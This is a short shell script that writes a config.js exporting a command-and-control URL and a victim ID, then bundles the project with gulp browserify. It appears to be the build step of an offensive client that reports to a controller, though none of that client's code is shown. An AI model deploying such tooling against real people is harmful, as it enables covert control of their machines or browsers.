#!/bin/sh

REALTIMEURL=$1

echo "module.exports = {
    COMMAND_CONTROL_URL: '${REALTIMEURL}',
    VICTIM_ID: '${VICTIMID}'
};"  > config.js

gulp browserify
